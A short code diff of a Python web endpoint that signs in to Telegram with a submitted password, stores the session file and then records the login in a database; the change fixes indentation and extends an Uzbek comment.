@@ -185,21 +185,21 @@ def verify_password():
     password = data.get("password")
 
     async def _verify():
-    client = TelegramClient(
-        os.path.join(SESSIONS_DIR, phone.replace("+", "")),
-        API_ID,
-        API_HASH
-    )
-    await client.connect()
-    await client.sign_in(password=password)
-    me = await client.get_me()
-    await client.disconnect()
-    return me
+        client = TelegramClient(
+            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+            API_ID,
+            API_HASH
+        )
+        await client.connect()
+        await client.sign_in(password=password)
+        me = await client.get_me()
+        await client.disconnect()
+        return me
 
     try:
         me = asyncio.run(_verify())
 
-        # ✅ LOGIN MUVAFFAQIYATLI
+        # ✅ LOGIN MUVAFFAQIYATLI → DB ga yozamiz
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
